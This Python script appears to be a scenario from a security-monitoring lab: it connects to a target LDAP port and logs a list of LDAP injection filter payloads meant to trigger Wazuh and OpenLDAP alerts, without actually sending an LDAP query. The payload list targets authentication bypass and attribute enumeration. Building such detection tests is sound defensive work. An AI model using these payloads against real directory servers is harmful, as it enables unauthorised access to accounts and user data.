#!/usr/bin/env python3
"""
Scenario 11: LDAP Injection Attack
- Difficulty: Intermediate
- Detection: Wazuh, LDAP logs
- Expected Alert: LDAP injection pattern, authentication bypass
"""

import sys
import argparse
import logging
import socket
import time

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class LDAPInjectionScenario:
    def __init__(self, target, port=389, verbose=False):
        self.target = target
        self.port = port
        self.verbose = verbose
        self.attempts = 0
        self.results = {
            'scenario': 'LDAP_INJECTION',
            'target': target,
            'port': port,
            'attempts': 0,
            'status': 'pending'
        }

    def create_ldap_payloads(self):
        """LDAP injection payload variations"""
        payloads = [
            "*)(uid=*",
            "*)(|(uid=*",
            "admin*",
            "*)(|(mail=*",
            "*)(|(cn=*",
            "*)(objectClass=*",
            "admin)(&",
            "*)(|(password=*",
        ]
        return payloads

    def test_ldap_injection(self):
        """Test LDAP injection"""
        logger.info(f"[*] Starting LDAP Injection against {self.target}:{self.port}")

        payloads = self.create_ldap_payloads()
        logger.info(f"[*] Testing {len(payloads)} LDAP injection payloads")

        try:
            for payload in payloads:
                self.attempts += 1

                try:
                    # Simulate LDAP connection and injection attempt
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((self.target, self.port))

                    # Send LDAP search request with injected filter
                    logger.info(f"[+] Attempt {self.attempts}: Testing filter: {payload}")

                    # LDAP search string with injection
                    ldap_filter = f"(|(uid={payload})(mail=admin@example.com))"
                    logger.info(f"    Filter: {ldap_filter}")

                    sock.close()
                    time.sleep(0.5)

                except socket.timeout:
                    if self.verbose:
                        logger.debug(f"[-] Connection timeout for {self.target}:{self.port}")
                except ConnectionRefusedError:
                    if self.verbose:
                        logger.debug(f"[-] Connection refused for {self.target}:{self.port}")
                except Exception as e:
                    if self.verbose:
                        logger.warning(f"[-] Error: {e}")

        except KeyboardInterrupt:
            logger.info("\n[!] Attack interrupted by user")
        except Exception as e:
            logger.error(f"[-] Attack failed: {e}")
            self.results['status'] = 'failed'
            return

        self.results['attempts'] = self.attempts
        self.results['status'] = 'completed'
        self.log_results()

    def log_results(self):
        """Log results"""
        logger.info("\n" + "="*60)
        logger.info("LDAP INJECTION RESULTS")
        logger.info("="*60)
        logger.info(f"Target: {self.target}:{self.port}")
        logger.info(f"Total Attempts: {self.attempts}")
        logger.info(f"Status: {self.results['status'].upper()}")
        logger.info("="*60)
        logger.info("\n[!] Check Monitoring Systems:")
        logger.info("  - Wazuh: Search for 'LDAP injection' alerts")
        logger.info("  - OpenLDAP logs: Check for syntax errors")
        logger.info("  - Prometheus: Monitor LDAP query patterns")
        logger.info("="*60 + "\n")

def main():
    parser = argparse.ArgumentParser(description='LDAP Injection Scenario')
    parser.add_argument('--target', required=True, help='Target LDAP server')
    parser.add_argument('--port', type=int, default=389, help='LDAP port')
    parser.add_argument('--verbose', action='store_true', help='Verbose logging')

    args = parser.parse_args()

    scenario = LDAPInjectionScenario(target=args.target, port=args.port, verbose=args.verbose)
    scenario.test_ldap_injection()

if __name__ == '__main__':
    main()
